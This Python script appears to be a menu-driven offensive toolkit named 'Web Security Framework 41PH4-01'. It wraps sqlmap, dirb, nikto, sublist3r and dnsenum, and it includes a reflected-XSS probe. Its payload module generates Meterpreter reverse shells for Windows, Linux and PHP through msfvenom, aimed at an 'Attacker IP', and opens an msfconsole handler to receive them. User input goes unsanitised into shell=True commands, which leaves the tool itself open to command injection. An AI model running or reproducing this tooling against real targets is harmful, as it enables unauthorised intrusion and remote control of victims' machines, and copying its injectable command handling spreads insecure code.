import os
import re
import subprocess
import threading
import requests
from urllib.parse import urljoin, urlencode
from bs4 import BeautifulSoup


# Global settings
SESSION = requests.Session()
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
}


# Utility Functions
def validate_url(url):
    """Check if a URL is valid."""
    pattern = re.compile(
        r'^(https?://)?([a-zA-Z0-9.-]+(\.[a-zA-Z]{2,})+)(/[^\s]*)?$'
    )
    return pattern.match(url)


def print_menu(options):
    """Print a styled menu."""
    print("\n" + "=" * 50)
    for i, option in enumerate(options, 1):
        print(f"[{i}] {option}")
    print("=" * 50)


def run_command(command):
    """Run a shell command."""
    try:
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")


# Web Application Testing
def web_testing_menu(target_url):
    print_menu([
        "SQL Injection Testing",
        "XSS Testing",
        "Directory Brute-forcing",
        "Nikto Vulnerability Scan"
    ])
    choice = input("Select an option: ")
    if choice == "1":
        sql_injection_test(target_url)
    elif choice == "2":
        xss_test(target_url)
    elif choice == "3":
        dir_brute_force(target_url)
    elif choice == "4":
        nikto_scan(target_url)
    else:
        print("Invalid choice.")


def sql_injection_test(target_url):
    print("Starting SQL Injection Test...")
    # Run SQLmap for automated testing
    run_command(f"sqlmap -u {target_url} --batch --level=5 --risk=3")


def xss_test(target_url):
    print("Testing for XSS vulnerabilities...")
    # Placeholder for XSS testing logic
    payload = "<script>alert('XSS')</script>"
    response = SESSION.get(urljoin(target_url, payload), headers=HEADERS)
    if payload in response.text:
        print("XSS vulnerability detected!")
    else:
        print("No XSS vulnerabilities found.")


def dir_brute_force(target_url):
    print("Running Directory Brute-force...")
    # Example using Dirb
    wordlist = "/usr/share/wordlists/dirb/common.txt"
    run_command(f"dirb {target_url} {wordlist}")


def nikto_scan(target_url):
    print("Running Nikto Vulnerability Scan...")
    run_command(f"nikto -h {target_url}")


# Payload Generation and Listener Setup
def payload_menu():
    print_menu([
        "Windows Reverse Shell",
        "Linux Reverse Shell",
        "PHP Reverse Shell"
    ])
    choice = input("Select a payload type: ")
    lhost = input("Enter LHOST (Attacker IP): ")
    lport = input("Enter LPORT (Listening Port): ")

    payload_map = {
        "1": "windows/meterpreter/reverse_tcp",
        "2": "linux/x86/meterpreter_reverse_tcp",
        "3": "php/meterpreter/reverse_tcp"
    }

    if choice in payload_map:
        payload_type = payload_map[choice]
        generate_payload(payload_type, lhost, lport)
        setup_listener(payload_type, lhost, lport)
    else:
        print("Invalid choice.")


def generate_payload(payload_type, lhost, lport):
    print(f"Generating payload: {payload_type}...")
    output_file = f"{payload_type.replace('/', '_')}.exe"
    run_command(
        f"msfvenom -p {payload_type} LHOST={lhost} LPORT={lport} -f exe -o {output_file}"
    )
    print(f"Payload saved as {output_file}")


def setup_listener(payload_type, lhost, lport):
    print(f"Setting up listener for {payload_type} on {lhost}:{lport}...")
    run_command(
        f"msfconsole -x 'use exploit/multi/handler; set PAYLOAD {payload_type}; set LHOST {lhost}; set LPORT {lport}; run'"
    )


# Information Gathering
def info_gathering_menu(domain):
    print_menu([
        "Subdomain Enumeration",
        "DNS Recon",
        "Social Media Recon"
    ])
    choice = input("Select an option: ")
    if choice == "1":
        subdomain_enum(domain)
    elif choice == "2":
        dns_recon(domain)
    elif choice == "3":
        social_media_recon(domain)
    else:
        print("Invalid choice.")


def subdomain_enum(domain):
    print("Enumerating Subdomains...")
    run_command(f"sublist3r -d {domain}")


def dns_recon(domain):
    print("Performing DNS Recon...")
    run_command(f"dnsenum {domain}")


def social_media_recon(domain):
    print("Scraping social media profiles...")
    # Placeholder for social media scraping


# Main Menu
def main_menu():
    print_menu([
        "Web Application Testing",
        "Payload Delivery & Exploitation",
        "Information Gathering"
    ])
    choice = input("Select a module: ")

    if choice == "1":
        target_url = input("Enter target URL: ")
        if validate_url(target_url):
            web_testing_menu(target_url)
        else:
            print("Invalid URL.")
    elif choice == "2":
        payload_menu()
    elif choice == "3":
        domain = input("Enter target domain: ")
        info_gathering_menu(domain)
    else:
        print("Invalid choice.")


if __name__ == "__main__":
    print("\nWeb Security Framework 41PH4-01")
    main_menu()
